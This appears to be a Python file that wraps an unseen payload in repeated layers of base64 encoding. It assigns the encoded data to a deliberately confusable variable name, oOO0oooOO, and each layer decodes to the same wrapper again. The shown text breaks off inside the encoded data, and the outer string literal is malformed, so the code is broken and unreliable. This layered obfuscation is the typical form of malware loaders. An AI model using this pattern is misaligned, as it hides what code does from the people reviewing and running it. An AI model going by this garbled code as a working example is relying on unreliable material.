import base64
oOO0oooOO = "import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwV1ZaamVHUXlTWHBUYWtKS1VqQndiMWw2U2xaTmF6VkNZMGhhVlUxRWFETlpha2sxWkd4UmQwOUhaRkZWTUVad1ZqQlNSazVYVVhsV2JHaFRZbTE0Y0ZadWNITk9WbVJGVWxSU2FVMVhaRFJVTVdoWFYyeGFObEp1VGxoU1JWVXdXWHBDYzFOR1RsaE9WbXhVVWpKT05WWkhNVFJPUlRWSFkwVldVbUpWTlhOVmEyUnZZMVprUm1GSE5VNWhlbFpJV2xWU1UxUnRSbk5qUjNCaFZsWktVMXBXV205VFYwWklaRVU1YVZOSFkzZFdSbFpUVWpGcmVWWnJhRlZYU0VKYVZUQmthMDVHVVhoWGFsSlBVbFJGTWxsVlpFOWlSa2w0VjI1S1dGSlhhSFpaVmxVeFl6SldSVlZyTlZOU01taHhWMnhXVTFSck1VZGhSV3hoWld4S2FGWnROVzVOUmxKeVdrWmtXazFzV2taVk1qQjRWMVpPU0dGSVVsVmlXR2N3Vkd0Vk1WWldWblJVYlhoVFRVWndkbFl3Vm05aWJWWnpZMFZrYkZKR1NtRlpiRnAzWVd4d1ZscEdXazlXYldoS1YyNXdVMVZHV25WYWVrSlZZbTVDV0ZkVVNsZFRSbEowWkVac1ZGSXlVVEZXUkVaaFRrVTFSazVXYUZSaVZUVnpWV3BHVmsxR1pFWmhSelZyVFVSU05GcFZVbE5VTWtwWFkwZHdZVlpYVWxOVVZscHZVMWRHU0dWR2NFNVhSMk4zVmpGa2QyTXhhM2xXYTJoV1lsUkdXbFV3Wkc5aU1WSlhWMnBTVDFKdGVIaFpWV1JQWWtaS1JrMVVWbGhTVjJoMldWVlZNVll5VmtWVmJVWlRUVWhDY1Zkc1ZsTlVhelZIWVVWc1lXVnNXbEJaYTJodVRVWlJkMVZyT1ZwTmJGcEdWVmN3ZUZkV1RraFpNM0JWVmxadk1GUnJWWGRsVmtwMFZHMTRVMDFXY0hoV01GWnZZakpLVms5VlpHeFNSa3BvV1ZkNGQyRnNjRlpWYTBwc1lrZG9TbGR1Y0V0VU1ERlpXbnBDV0dKR1NsaFhWRXBYVWxacmVtTkdiRlJTTW1nd1ZrUkNZVTVGTlVaT1dFWldZbFUxYzFWcldrWk5SbVJHWVVjMVQxWnRlRmhhVlZKVFdWWkplRmR0Y0dGV1YxSlBXbFphYjFOV2NEWlNhemxUWW0xamQxWkhkRk5pTVd0NVZtdFdXbVZyTlZwVk1HUnZaRVprV0dWRVVrOVNia0pHVlcweFQySkdTa2RXYWxaWVVsZG9kVnBWVlhoU01sWkZWVzFHYUdKWGFIRlhiRlpyVjIxUmVHRkZiR0ZsYkZwUFZGWm9iazFHWkhOVmF6bGFUV3hhUmxsWWNFdFhWazVJV2tST1ZVMUdiekJVYTFVeFkxWlNkRlJ0ZUZOU1ZFRjRWakJXYjJKck1VWlBWV1JzVWtaS1VGVnFSa3RoYkhCV1ZXczVhRkp0YUVwWGFrNXZWVVpLZFZwNlFsVk5Sa3B5VjFSS1YxSldaRlZXYkd4VVVqSlJNbFl5ZUdGT1JUVkdUbFpXVldKVk5YTlZhMXBIVG14a1JtRkhOVTVTVkVJMFdsVlNVMVJzV2tkWGJYQmhWbGRTUzFwWGVHOVRWbTk2WVVad1RsZEhZM2RXTW5SclZURnJlVlpyYUZoWFIzaGFWVEJrYW1WV1VsVlNhbEpQVWxSV2VGWXlNVTlpUmtsNFVtcGFXRkpYYUhWVVZscDNVakpXUlZWc1FsTk5TRUp4VjJ4V2ExZHJNVmRoUld4b1VqTkNVRlp0Tlc1TlJsSldWV3RrV2sxc1drWlZWbWh6VjFaT1NHRklVbGhoTVc4d1ZHdGFkMWRHVm5SVWJYaFRVbFp3ZUZZd1ZtOWlNa1pHVDFWa2JGSkdTbEJhVnpGdllXeHdWbHBGWkdsV2JXaEtWMjV3UzFWR1duVmFla0pWVmpOQ1RGZFVTbGRTVmtwWllVWnNWRkl5VGpaV1JFSmhUa1UxUjJOR2FGUmlWVFZ6Vld0Vk1XTkdaRVpoUnpWUFZsUnNTRnBWVWxOWlZrbDRVMjF3WVZaWFVsTmFWVnB2VTFad05sUnJPVTVYUjJOM1ZrZDBVMVl4YTNsV2EyaFhWMGRvV2xVd1pHOWtSbEpXVjJwU1QxSnVRa2xXVnpGUFlrWkpkMVpZYkZoU1YyaDFXa1JCTVZJeVZrVlZiSEJvWWtad2NWZHNWbXRWYlZaellVVnNZV1ZyY0ZGVmJUVnVUVVpTVmxWclRscE5iRnBHVmpGU1IxZFdUa2haTTJ4VlZsWnZNRlJyVlhoT2JGSjBWRzE0VTAxVlZqUldNRlp2WWpKS1JrMVZaR3hTUmtwb1dXeGFTMkZzY0ZaYVJscHNWbTFvU2xsVlkzaFVNVXAxV25wQ1ZWWXpRbGhYVkVwWFVsWnJlbU5HYkZSU01rNDFWa1pTUjA1Rk5VZGlSRnBTWWxVMWMxVnFSa3RqVm1SR1lVYzFhMDFFVm5wYVZWSlRWREZLU0dWSGNHRldWa3BJV1d0YWIxTldiM3BoUmtKVFltMWpkMVpFUWxOU01XdDVWbXRvVkZaR1dscFZNR1JyVGtaa1dHVkVVazlTVkZaWlZrY3hUMkpHU2taalJ6bFlVbGRvZGxsVlZURldNbFpGVld4d1YwMVdjSEZYYkZaclZESkdSMkZGYkdGbGExcFFWRlpvYmsxR1pISmFSVGxhVFd4YVJsVnNhRzlYVms1SVlVaENWV0ZyV1RCVWExVjRVbFpXZEZSdGVGTk5SbFkyVmpCV2IySXlSbFpOVm1Sc1VrWkthRlZyV2t0aGJIQldXa1UxVDFadGFFcFhibkJMVkRBeFdWcDZRbGhpUmtwNlYxUktWMUpXWkZsaVJteFVVakpvZGxaSGVHRk9SVFZIWWtoR1UySlZOWE5WYWtaM1l6RmtSbUZITlU1aVNFSjZXbFZTVTFRd01YSk9WM0JoVmxkU1dGbFVSbTlUVm05NllVWndhVk5IWTNkV1IzaHJWakZyZVZaclZsWlhSMmhhVlRCa2EwNUdaSFJsUkZKUFVtNUNWbFpYTVU5aVJrcEhVbGhzV0ZKWGFIWlpiRlV4VWpKV1JWVnNRbGRTTTJoeFYyeFdhMVF5UmxkaFJXeGhUVEo0WVZscmFHNU5SbVJZWTBWa1drMXNXa2xXTWpGM1YxWk9TR0ZJU2xWTlJtOHdWR3RWTlZkR1duUlViWGhUVWxWd2VsWXdWbTlpTWtaSFkwaE9iRkpHU21GWlZ6RnZZV3h3VmxwRlpHaFNiV2hLV1ZWa2QxZHRTa2xhZWtKVlZteEtTRmRVU2xkVFJtUlZWbXhzVkZJeVVURldSM0JIVGtVMVIyRXpiRlJpVlRWelZXdGtiMk5XWkVaaFJ6bHBVbFJDTkZwVlVsTlVNVnBHVTIxd1lWWldTbGRhUkVadlUxWndObFp0UmxOaWJXTjNWa1phYTFVeGEzbFdhMVpwVWpOQ1dsVXdaRzlqUm1SWVpVUlNUMUpVUmtsV01qRlBZa1pLUjFKcVVsaFNWMmgxVkZWVmQyVkhWa1ZWYkhCb1lYcFdjVmRzVmxOak1rcFhZVVZzWVdWc1drOVVWbWh1VFVaa2MxVnJUbHBOYkZwSlZXeFNTMWRXVGtoaFNFcFlZa1p2TUZSclZURk9iSEJJVkcxNFUwMVdXVEJXTUZadlltMVJkMDVWWkd4U1JrcFFXVmN4VTJGc2NGWlZhMDVvVW0xb1NsZHFUbk5YYkZwMVducENWVlpYVWtoWFZFcFhVbFphVlZSc2JGUlNNbEV4Vmtaa05FNUZOVVpPV0VaVVlsVTFjMVZyVm5Ka01XUkdZVWM1YUdKSVFraGFWVkpUVkRKV2NrNVhjR0ZXVmtweVdWZDRiMU5YUmtoTlZuQnBVMGRqZDFaSE1IaFpWbXQ1Vm10V1drMHpRbHBWTUdSdll6RmtWMWRxVWs5U1ZHeEdXV3RrVDJKR1NraFZiazVZVWxkb2RWUldWVFZTTWxaRlZXMUdhR0pZYUhGWGJGWnJWREpHVjJGRmJHRk5NbWhvVlcwMWJrMUdaRmhOVlhSYVRXeGFSbGxVVG5OWFZrNUlXVE5rVldKR2J6QlVhMVV4WkVaU2RGUnRlRk5TVm5CM1ZqQldiMkp0Vm5KUFZXUnNVa1pLWVZwWGVHRmhiSEJXVld0YVRrMVhhRXBYYWs1cldWWktkVnA2UWxWaVIxSklWMVJLVjFKV1NsVldiR3hVVWpKb2RsWkhjRWRPUlRWR1RWVm9WbUpWTlhOVmEyUnFaREZrUm1GSE5VNWlTRUpZV2xWU1UxUXhTa2hWYlhCaFZsWktTMVJyV205VFZuQTJVbXMxVjJKdFkzZFdSRVpUVlRGcmVWWnJWbGRpVjJoYVZUQmtiMk5zWkhKWGFsSlBVbFJXU1ZadE1VOWlSa3BHVW1wYVdGSlhhSFpaVmxVeFl6SldSVlZyTldoaVJYQnhWMnhXVTFOck1YTmhSV3hvVWpKNGFGWnROVzVOUmxGM1ZXczVXazFzV2taV2JURTBWMVpPU0ZwRVRsaGlSbTh3Vkd0YWMwNXNjRWhVYlhoVFVsWlZlRll3Vm05aWF6RkdUVlprYkZKR1NtRlpiRnAzWVd4d1ZscEdjRTlXYldoS1dWVmtiMWR0U2tsYWVrSlZWMGhDY2xkVVNsZFNWbTk2WTBac1ZGSXlhSGhXUmxKSFRrVTFSMk5HVmxOaVZUVnpWV3BHZDJOR1pFWmhSelZPWVhwQ05GcFZVbE5WUmtwR1kwZHdZVlpYVWtkVVZFWnZVMVp2ZWxwR2NFNVhSMk4zVmpJd2VGUXhhM2xXYTFaVFZrVndXbFV3Wkdwa01XUnpWMnBTVDFKdVFuaFdWekZQWWtaS1JtRXpiRmhTVjJoMldXeFZNVkl5VmtWVmJIQlhUVlp3Y1Zkc1ZsTlZNa1pIWVVWc1lVMHllRkJVVm1odVRVWmtXR05GZEZwTmJGcEpWbGN4YzFkV1RraFpla0pWWVd0Wk1GUnJXbmRUUmtwMFZHMTRVMDFIZERaV01GWnZZakpHVmsxWVRteFNSa3BRVm10a05HRnNjRlpWYTFwc1ZtMW9TbGRxVG5kWGJVcEpXbnBDVldKR1NreFhWRXBYVTBaT1ZWUnNiRlJTTWxFeFZqSXhORTVGTlVaT1dFWnBVakExYzFWclZuTk5NV1JHWVVjMVRtRjZWbnBhVlZKVFYyeFpkMWR0Y0dGV1YxSlFXVlZhYjFOV2NEWlZiSEJYWW0xamQxWkdVa3RXTVd0NVZtdFdWbGRIVWxwVk1HUnFUVVpTVmxkcVVrOVNiWGd3VmxjeFQySkdTa1pqU0VKWVVsZG9kbGxVUm5kU01sWkZWV3hDVjFKdVFuRlhiRlpUVTIxV1IyRkZiR0ZOTWxKUlZXMDFiazFHVW5OYVJYUmFUV3hhU1ZVeFVsZFhWazVJWVVjNVZWWXpaekJVYTFWNFkxWmFkRlJ0ZUZOTlZuQXdWakJXYjJKck1IZFBWbVJzVWtaS2FGbFhlSGRoYkhCV1ZXczFUMUp0YUVwWGJuQkhWREF4V1ZwNlFsVmlSMUpVVjFSS1YxTkdWbFZUYkd4VVVqSm9lVlpFUm1GT1JUVkhZVE5zVkdKVk5YTlZhMlJQVG14a1JtRkhPV2hoZWxaWVdsVlNVMVJ0Um5OVGJYQmhWbFpLVTFwV1dtOVRWbTk2V2tVMVRsZEhZM2RXUkVaVFl6RnJlVlpyYUZSaVYzaGFWVEJrYjJOV1VuTlhhbEpQVW01Q1ZsWXlNVTlpUmtsNFlrUlNXRkpYYUhaWlZFRTFVakpXUlZWdFJsZFNXRUp4VjJ4V1UyRnJNVmRoUld4aFpXeGFUMWxyYUc1TlJtUnpWV3QwV2sxc1drWldWbEpIVjFaT1NGcEVXbFZOUm04d1ZHdFZlRTV0UmtoVWJYaFRUVVJGTWxZd1ZtOWlhekZ6WWtoT2JGSkdTbWhaVnpGdllXeHdWbHBGV2s1V2JXaEtWMjV3VjFReFNuVmFla0pWWWtaS2RsZFVTbGRUUmtwVlVXeHNWRkl5YURCV1JsSkhUa1UxUmsxV2FGVmlWVFZ6Vld0YVlXUkdaRVpoUnpWc1VtMTBORnBWVWxOVWJVWnpWMjF3WVZaV1NsUlpiRnB2VTFad05sUnJPV2xUUjJOM1ZrY3dlRkl4YTNsV2EyaFVZbGQ0V2xVd1pHdE5NVkp4VW1wU1QxSlVSbFpXTWpGUFlrWkplR0Y2UmxoU1YyaDFXbGQ0ZDJNeVZrVlZiRUpUVFVSV2NWZHNWbE5SYXpCNFlVVnNZV1ZyTldGVVZtaHVUVVpSZUZwRk9WcE5iRnBKVlRGU1MxZFdUa2hoU0VaWVlURnZNRlJyVlhoV1YwWklWRzE0VTFJelRqVldNRlp2WW0xUmVHTkdaR3hTUmtwb1dWY3hVMkZzY0ZaYVJUVlBVbTFvU2xsVlpHOVVNVnAxV25wQ1ZWWnNTbEJYVkVwWFUwWk9XV05HYkZSU01sRXdWakZhWVU1Rk5VWlBWbWhYWWxVMWMxVnFSbFprTVdSR1lVYzFhMDFYZUhwYVZWSlRXVlpLUmxOdGNHRldWa3BFV1ZSR2IxTlhSa2hpUjBaVFltMWpkMVl5ZUZOaE1XdDVWbXRXVlZaRlNscFZNR1J2WTFaU1YxZHFVazlTVkVaV1dXdGtUMkpHU2tkalNGSllVbGRvZFZwVlduZFNNbFpGVldzNWFWWldjSEZYYkZaVFVtMVdWMkZGYkdGTk1sSm9XV3RvYmsxR1VsVlRhemxhVFd4YVJsZHJaREJYVms1SVlVaEtWV0pZWnpCVWExVjNaVlpLZEZSdGVGTlNNRFF5VmpCV2IySXlSa2RoTTJoc1VrWktZVnBYTVRSaGJIQldWV3RrYUUxWGFFcFpWV1F3V1ZaYWRWcDZRbFZXUlhCSVYxUktWMU5HU2xWV2JHeFVVakpvTUZZeFpEUk9SVFZHVGxaV1VtSlZOWE5WYTFweVpWWmtSbUZIT1doTlJHeElXbFZTVTFkdFNsZGpSM0JoVmxaS1dGbFVSbTlUVm05NlkwWndWMkp0WTNkV1JFWlRZakZyZVZaclZsUmlXRUphVlRCa2FtVldaSFJsUkZKUFVsUkdlRll5TVU5aVJrcEhVMjVPV0ZKWGFIWlpWM040VWpKV1JWVnJPVk5TTW1oeFYyeFdVMUl5UlhoaFJXeGhUVEpvWVZadE5XNU5SbVJaWTBWT1drMXNXa2xXYkZKTFYxWk9TRmt6YkZoaVJtOHdWR3RhYzFaV1duUlViWGhUVW14d2VsWXdWbTlpYXpCM1QxVmtiRkpHU2s5YVYzaGhZV3h3VmxwR1pHbFNiV2hLVjJwT2IxZHJNVmxhZWtKVlYwaENXRmRVU2xkU1ZtdzJWbXhzVkZJeVVUSldSM0JIVGtVMVIySkVXbWhTTURWelZXcEdkMkl4WkVaaFJ6VlBVbTVDU0ZwVlVsTlpWa2wzVjIxd1lWWldTa05VVjNodlUxWndObFJyT1ZkaWJXTjNWakZvZDFFeGEzbFdhMVphWld0YVdsVXdaR3RPVm1SVlVtcFNUMUpVUWpWV01qRlBZa1pLU0dWSVFsaFNWMmgxV2xaVk1WSXlWa1ZWYkhCc1lrWndjVmRzVmxOV2JWWlhZVVZzWVdWck5XRlVWbWh1VFVaa2RHTkhPVnBOYkZwSlZURm9hMWRXVGtoYVJFNVZUVlp2TUZSclduZGtSazUwVkcxNFUwMVlRblpXTUZadlltczFSazFZVG14U1JrcFBXV3hhZDJGc2NGWlZia3BPVW0xb1NsZHFUbXRaVmxwMVducENXR0pVUmxCWFZFcFhVMFpPZEdGR2JGUlNNbWg1VmpKNFlVNUZOVWRoTTJ4WFlsVTFjMVZyV25KbGJHUkdZVWM1YUUxRWJFaGFWVkpUVjIxS1YxTnRjR0ZXVjFKaFZGWmFiMU5XYjNwYVJUVk9WMGRqZDFZeFdtdFZNV3Q1Vm10V1ZWZEhlRnBWTUdScVpVWmtjMWRxVWs5U1ZHeFpWakl4VDJKR1NraFVXR3hZVWxkb2RWcFdXbk5XTWxaRlZXeENWMUp1UW5GWGJGWnJWVzFXVjJGRmJHRmxiRXBSVm0wMWJrMUdaSEpWYlRsYVRXeGFTVlZzVWtOWFZrNUlXWHBDVldKR2J6QlVhMVY0WkVaU2RGUnRlRk5TYTFZelZqQldiMkpyTlVaUFZtUnNVa1pLVUZsc1dtRmhiSEJXVld0YVQxSnRhRXBYYm5CTFZHc3hXVnA2UWxWTlJrcFFWMVJLVjFOR1ZsVlRiR3hVVWpKb2VsWkdXbUZPUlRWSFkwVldWbUpWTlhOVmFrWkhUa1prUm1GSE5XdE5SRlo2V2xWU1UxZHJNWEpqUjNCaFZsWktWMVJXV205VFYwWklZa1p3YVZOSFkzZFdSRVpUVVRGcmVWWnJWbFJpVjNoYVZUQmtiMk5zVWxWU2FsSlBVbFJHUmxaWE1VOWlSa3BHWVROa1dGSlhhSFZVVkVaM1l6SldSVlZ0Um1oaVJYQnhWMnhXVTFkdFZrZGhSV3hoWld4S1QxUldhRzVOUm1SMFRWWmtXazFzV2tsV1JsSlRWMVpPU0ZwRVRsVmhNVzh3Vkd0Vk1XUkdVblJVYlhoVFVqQXdkMVl3Vm05aU1rWldUVWhvYkZKR1NrOVZhMlJ2WVd4d1ZsVnRPV2xXYldoS1dWVmtNRlJ0U2tsYWVrSllZbGhDVEZkVVNsZFNWbHBWVkd4c1ZGSXlUWGhXTVZKSFRrVTFSMk5GVmxkaVZUVnpWV3BDZDJSR1pFWmhSemxvVWxSR2VscFZVbE5VYkZwSVpVZHdZVlpXU2xkYVZWcHZVMWRHU0dOR2NGZGliV04zVmpKMGExWXhhM2xXYTFaU1lsaENXbFV3Wkc5amJGSldWMnBTVDFKVVJUSlhhMlJQWWtaSmQyRjZSbGhTVjJoMVZHdFZNR1ZIVmtWVmJVWlhVbXh3Y1Zkc1ZtdFVhekZIWVVWc1lXVnNTbEJVVm1odVRVWmtWMVZ1VGxwTmJGcEdWVmN4YzFkV1RraGFSRTVWVFZadk1GUnJWVEZqVmxKMFZHMTRVMUl6YUhoV01GWnZZbTFXUms1V1pHeFNSa3BQVld0a2IyRnNjRlphUjBab1RWZG9TbGxWWkhkVU1VcDFXbnBDVlUxV1NuSlhWRXBYVWxaS2RHUkdiRlJTTW1oNFZrWmtORTVGTlVaT1ZsWlNZbFUxYzFWcVFuTk5NV1JHWVVjMWJGSlVRalJhVlZKVFZHMUdjMWR0Y0dGV1YxSlBWRlZhYjFOWFJraGhSVFZPVjBkamQxWkdXbE5WTVd0NVZtdG9WbUpZUWxwVk1HUnFaREZTYzFkcVVrOVNWRlpKVlRJeFQySkdTa1pUYmxKWVVsZG9kbGxzVlhoV01sWkZWV3MxYUdFelFuRlhiRlpUWTJzMVYyRkZiR0ZOTW1oUlZtMDFiazFHVVhoVmJFNWFUV3hhU1ZWc1VrdFhWazVJWVVoS1dGWnNiekJVYTFVeFkxZEtTRlJ0ZUZOU1ZGWjRWakJXYjJJeVJrWk5WV1JzVWtaS2FGWnJaRzloYkhCV1drWk9hVkp0YUVwWGFrNXpWREF4V1ZwNlFsVldNMEo2VjFSS1YxSldjRFpWYkd4VVVqSk9ORlpHWkRST1JUVkdUbFJhVm1KVk5YTlZhMXBMWTBaa1JtRkhOVTVTVkd4WVdsVlNVMVZHU2taVGJYQmhWbGRTU0ZsV1dtOVRWMFpJWlVkR1UySnRZM2RXUkVaclZURnJlVlpyVmxKWFNFSmFWVEJrYjJOR1VuRlNhbEpQVWxSR2VGbFZaRTlpUmtwR1VsaGtXRkpYYUhWYVYzaHpZekpXUlZWck5XaGlWa3B4VjJ4V2ExUnJNVmRoUld4aFRUSjRVVlp0Tlc1TlJsSlZVMjFHV2sxc1drbFdNV2gzVjFaT1NHRklRbFZpV0djd1ZHdGFkMk5XWkhSVWJYaFRVbFpXTTFZd1ZtOWlhelZHVGxWa2JGSkdTazlVVjNNeFlXeHdWbHBHU2s1aVIyaEtXVlZrTUZsV1duVmFla0pWWW01Q2RsZFVTbGRTVmtaWldrWnNWRkl5YUhaV1IzaGhUa1UxUjJKRVdsZGlWVFZ6Vld0YVJtVnNaRVpoUnpWT1lYcHNTRnBWVWxOVU1rWnlZMGR3WVZaV1NrZFVWM2h2VTFkR1NHTkdjRmRpYldOM1ZrZDBhMUl4YTNsV2ExWlZWa1UxV2xVd1pHdE5NVkYzVjJwU1QxSlViRlpXUnpGUFlrWktSMWR0T1ZoU1YyaDJXVlpWZDJWSFZrVlZiRUpUVWxWd2NWZHNWbE5WYXpWSFlVVnNhRko2Um1GV2JUVnVUVVpTVmxwRmRGcE5iRnBHVmtjeE1GZFdUa2hhUkZwVllXdFpNRlJyV25OT2JIQklWRzE0VTAxVmNEQldNRlp2WW0xUmVHTkZaR3hTUmtwUVdXeFZNV0ZzY0ZaYVJuQk9VbTFvU2xsVlpITlZSbHAxV25wQ1dHRXlVbFJYVkVwWFVsWldkR1ZHYkZSU01sRjZWa1JDWVU1Rk5VWk9WbWhZWWxVMWMxVnJWbkpsVm1SR1lVYzFUMUp0ZERSYVZWSlRWMnhaZDJOSGNHRldWa3BNV1ZkNGIxTldjRFpWYXpWWFltMWpkMVl5ZEd0U01XdDVWbXRvV0ZkSFVscFZNR1JxVFZaUmVGZHFVazlTVkd4SlZUSXhUMkpHU2taaGVrWllVbGRvZFZSc1ZUVlNNbFpGVld4Q1UxSlVWbkZYYkZaVFUyc3dlR0ZGYkdoU00wSm9WVzAxYmsxR1VuUmpSVGxhVFd4YVJsWXlNVFJYVms1SVdUTnNWV0pZWnpCVWExVXdaVlpTZEZSdGVGTlNia0l3VmpCV2IySnRVWGROVldSc1VrWktUMWxzV2t0aGJIQldXa1pPYVZKdGFFcFhibkJEVkd4S2RWcDZRbGhXYlZKb1YxUktWMU5HVm5SaVJteFVVakpPTmxZeFVrZE9SVFZHVFZaV1YySlZOWE5WYTJSNlRWWmtSbUZITlU1V2JrSklXbFZTVTFsV1dYaFhiWEJoVmxaS1lWcFZXbTlUVjBaSVpVZEdhVk5IWTNkV1JsSkxXVlpyZVZaclZtaGxiRnBhVlRCa2EwNVdVbFZTYWxKUFVsUkdWbFpITVU5aVJrcEdZMGhLV0ZKWGFIVlVWRVp5WlVkV1JWVnRSbWhoTTBKeFYyeFdVMUZ0VVhoaFJXeGhUVEpTYUZadE5XNU5SbVJ5VlcwNVdrMXNXa1pXUm1odlYxWk9TRmt6WkZoV00yY3dWR3RWTVZKV1pIUlViWGhUVWpKUk1WWXdWbTlpYXpCM1RraG9iRkpHU21oVmFrWmhZV3h3VmxWc1dteFNiV2hLVjI1d1ExUnNTblZhZWtKWVZtMVNVRmRVU2xkU1ZtUlZVbXhzVkZJeWFIbFdSbVEwVGtVMVIySkdWbFJpVlRWelZXdGtiMlJHWkVaaFJ6Vk9UVmQ0ZWxwVlVsTlhiVVp5WTBkd1lWWlhVazlVVkVadlUxZEdTRTFXY0dsVFIyTjNWa1JHYTFZeGEzbFdhMmhYVmtWYVdsVXdaRzlqYkZKelYycFNUMUpVYkVaWlZXUlBZa1pKZUZaVVJsaFNWMmgxVkZSQmVGSXlWa1ZWYXpsWFRWWndjVmRzVmxOVmJWWnpZVVZzWVdWcmNHaFphMmh1VFVaU2NWTnNaRnBOYkZwSlZURlNTMWRXVGtoaFJ6bFlWak5uTUZSclZURlRSa3AwVkcxNFUxSnVRakJXTUZadlltMVdWazlXWkd4U1JrcFJWV3RXUzJGc2NGWlZhelZzWWtkb1NsZHVjRmRaVmxwMVducENXRll6UWt4WFZFcFhVbFpLV1dOR2JGUlNNazQyVmtkNFlVNUZOVWRqUlZaWFlsVTFjMVZyV2xaa01XUkdZVWM1YVZaVVFqUmFWVkpUVkRKV2MxZHRjR0ZXVjFKUVdXdGFiMU5XYjNwaVJUbFRZbTFqZDFaRVJsTlJNV3Q1Vm10V1dGZElRbHBWTUdSdllqRlNWMWRxVWs5U2JYaFdWMnRrVDJKR1NraGhTRUpZVWxkb2RWUlVSbk5XTWxaRlZXczFhR0pGY0hGWGJGWlRVbXN4UjJGRmJHaFNNMEpRVlcwMWJrMUdaSEpWYkU1YVRXeGFSbFpXVWs5WFZrNUlXa1JTV0Zac2J6QlVhMVY0Vmxaa2RGUnRlRk5TTTJoNVZqQldiMkl5U2xaT1dFNXNVa1pLYUZWclZrdGhiSEJXV2tWd2EwMVhhRXBaVldSelZVWmFkVnA2UWxWV1ZrcHlWMVJLVjFOR1ZsVlJiR3hVVWpKb2VWWkdVa2RPUlRWSFkwVldVMkpWTlhOVmEyUjZUVVprUm1GSE5VNU5SRlo2V2xWU1UxUXhXWGRPVjNCaFZsZFNXRmxXV205VFYwWklaVVUxVTJKdFkzZFdNblJyVWpGcmVWWnJWbFpXUlRWYVZUQmthbVZXVWxWU2FsSlBVbFJXUmxsVlpFOWlSa3BJWXpOc1dGSlhhSFpaVjNoell6SldSVlZ0Um1sV1ZGWnhWMnhXVTFGck1IaGhSV3hoVFRKNFQxbHJhRzVOUm1SWFZXNU9XazFzV2tsVk1qQjRWMVpPU0dGSVFsVmhhMWt3Vkd0Vk5WTkdVblJVYlhoVFVqTlJNbFl3Vm05aU1rWlhZMFprYkZKR1NrOVZhMVozWVd4d1ZscEZjRTlXYldoS1YyNXdUMVJzU25WYWVrSlZWbFpLVkZkVVNsZFNWbVJWVTJ4c1ZGSXlhSHBXTW5SaFRrVTFSMkpJUmxOaVZUVnpWV3RrVTJOc1pFWmhSelZyVFZkME5GcFZVbE5VTURGelUyMXdZVlpYVWxoWlZscHZVMWRHU0UxVk9WZGliV04zVmtaV1UyTXhhM2xXYTFacFVqTlNXbFV3Wkd0Tk1WSjBaVVJTVDFKVVZUSlpWV1JQWWtaS1IySkVUbGhTVjJoMVZGVlZOVkl5VmtWVmF6Vm9ZVE5DY1Zkc1ZsTlpWMFpIWVVWc1lXVnJTazlVVm1odVRVWmtXRTFXWkZwTmJGcEpWVEZTVDFkV1RraFpNM0JZWWtadk1GUnJWWGhUUmxaMFZHMTRVMUpYZEROV01GWnZZbXN3ZUdOSVRteFNSa3BQV1d4Vk1XRnNjRlpWYlRscFVtMW9TbGxWWTNoWGJVcEpXbnBDV0dKSFVsaFhWRXBYVWxaT1ZWTnNiRlJTTW1oNVZrWlNSMDVGTlVkaVNFWllZbFUxYzFWclpHdE9SbVJHWVVjMWJGSnVRbGhhVlZKVFZHeEtSMWR0Y0dGV1ZrcDJXV3RhYjFOV2IzcGpSMFpYWW0xamQxWkdaSGRVTVd0NVZtdG9WR0pVUmxwVk1HUnJUa1pTV0dWRVVrOVNWRll3VmtjeFQySkdTa2RYYlRsWVVsZG9kbGxzVlRGak1sWkZWV3h3VjAxSVFuRlhiRlpyVm1zd2VHRkZiR0ZsYkZwUVZtMDFiazFHWkhSalJrNWFUV3hhUmxaR1VrdFhWazVJV1hwQ1ZWWXpaekJVYTFwelZsWk9kRlJ0ZUZOTlZWWTJWakJXYjJKck1YSk5WbVJzVWtaS1VGWnFSbUZoYkhCV1drVmthVkp0YUVwWGJuQlRXVlpLZFZwNlFsVmhhM0JRVjFSS1YxSldVblJqUm14VVVqSm9lVll5TVRST1JUVkdUVmhTVTJKVk5YTlZhMlI2VFVaa1JtRkhOV3hoZW14SVdsVlNVMVZHU1hoVGJYQmhWbFpLVjFSWGVHOVRWbTk2WTBaQ1YySnRZM2RXTW5SVFZURnJlVlpyYUZOaVYyaGFWVEJrYW1WR1pGVlNhbEpQVWxSc1NWVnRNVTlpUmtwR1UyNVNXRkpYYUhWVWExVTFVakpXUlZWc1FsZE5TRUp4VjJ4V2ExSnJNVWRoUld4b1VqSjRZVmxyYUc1TlJsSlhWV3QwV2sxc1drWldSbWh2VjFaT1NHRklVbFZoYTFrd1ZHdGFkMUpXVm5SVWJYaFRVbFZXTmxZd1ZtOWliVlpHVDFaa2JGSkdTazlXYTFVeFlXeHdWbFZzU210TlYyaEtWMjV3VjFWR1duVmFla0pWVFZaS1NGZFVTbGRUUmxwMFlVWnNWRkl5VGpSV1JFSmhUa1UxUmsxV2FGVmlWVFZ6Vld0V1JtVldaRVpoUnpsb1RWZDRXRnBWVWxOVU1sWjBWVzF3WVZaV1NrOVVhMXB2VTFkR1NHRkZOVTVYUjJOM1ZrY3dlRlF4YTNsV2ExWlRWa1UxV2xVd1pHOWpWbEp6VjJwU1QxSnRkekpaYTJSUFlrWktSMVpZY0ZoU1YyaDFWR3hWZUZZeVZrVlZhelZwVmxSV2NWZHNWbXRXYXpCNFlVVnNhRkl5YUU5V2JUVnVUVVpTV1dORmRGcE5iRnBHVlZab2MxZFdUa2hoU0VKVllXdFpNRlJyVlRGV1YwcElWRzE0VTFJelVUSldNRlp2WW1zMVJrMVlUbXhTUmtwaFZGZDRTMkZzY0ZaVmEzUm9Za2RvU2xkdWNFdFhhekZaV25wQ1ZWWldTbFJYVkVwWFVsWk9WVk5zYkZSU01sRjZWa1prTkU1Rk5VZGlTRVpVWWxVMWMxVnJaR3BsUm1SR1lVYzFUbEpVYkZoYVZWSlRWVVpLU0dWSGNHRldWa3A2V1ZaYWIxTlhSa2hrUlRWVFltMWpkMVl4VWt0VU1XdDVWbXRXVm1KWWFGcFZNR1J2WWpGU2MxZHFVazlTVkd4V1ZrY3hUMkpHU2tkV2FrNVlVbGRvZFZSclZURmpNbFpGVldzNVYxSldjSEZYYkZaVFUyc3hWMkZGYkdGbGJFcFBWRlpvYmsxR1VYZFZiRTVhVFd4YVJsZHVjRWRYVms1SVdYcENWVlpXYnpCVWExVXdaVlpXZEZSdGVGTk5WM1EwVmpCV2IySXlTbFpPVldSc1VrWktUMVpyV2t0aGJIQldWVzVLVGxadGFFcFhibkJEV1ZaS2RWcDZRbGhXYkVweVYxUk